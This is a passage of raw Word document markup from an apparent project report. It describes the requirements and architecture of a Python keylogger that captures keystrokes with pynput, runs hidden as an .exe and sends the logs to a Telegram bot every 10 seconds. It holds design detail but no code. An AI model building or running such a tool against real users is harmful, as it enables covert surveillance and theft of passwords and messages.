          <w:p w14:paraId="1167DDCB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve">Capture all keyboard input using </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>pynput</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="22ABD59E" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BAA88E8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Log Storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7852FC74" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Store captured keys temporarily in memory.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="162CAA4D" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="352EE265" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telegram Notification</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62B007EB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Send logs to a pre-configured Telegram chat every 10 seconds.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="53A35EC6" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A8DFCFA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Exit Command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="442ED4B8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve">Typing </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>exitlog</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve"> stops the program safely.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="2865468F" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D77BA28" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Background Operation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="352D5D69" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Run without showing console (if packaged as .exe).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5050A561" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="72D93311">
          <v:rect id="_x0000_i1386" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E55461" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.3 Non-Functional Requirements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E2D46C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Security:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> The bot token and chat ID must be kept private.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FBFC23" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Performance:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> The logger must run with minimal CPU usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E04C0CE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Portability:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Should run on both Windows and Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67655C80" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Scalability:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Reporting interval can be changed easily in code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369A8726" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="1188FA5B">
          <v:rect id="_x0000_i1387" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="613F7ED1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.4 System Architecture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF0F2BD" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>The Telegram keylogger system consists of three main modules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459D1C32" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Keyboard Listener Module:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Uses </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput.keyboard.Listener</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture keystrokes and append them to a log string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374F7458" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram Reporting Module:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Uses </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>requests.post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>() to send log data to the Telegram Bot API endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2F2710" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Controller Module (Thread Scheduler):</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Uses Python’s </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>threading.Timer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to send logs every 10 seconds automatically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FA7B82" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Workflow:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31611D3E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>User runs the program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75ABA677" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Keystrokes are captured and stored in memory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551E265B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Every 10 seconds, the log is sent to the Telegram chat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B2461B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>When user types “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>,” the program stops safely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52383381" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="4EF92D2E">
          <v:rect id="_x0000_i1388" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="511CB075" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>3.5 Design Diagram</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AA6094" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Below is the conceptual diagram adapted for Telegram:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2747F312" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E44C332" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>|  User Keyboard    |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F011DD7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>|   Input           |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E2C8A6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3878C5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">         |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147E100F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">         v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433AD7E8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4379AB8F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>|  Keyboard Listener|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB76358" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>|  (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>)         |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6AEB00" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C65C81" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">         |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD7A44C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">         v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC6AC96" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D7BA13" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>|   Log Buffer      |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590A64F6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>| (String Variable) |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED00728" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>+-------------------+</w:t>
      </w:r>
    </w:p>
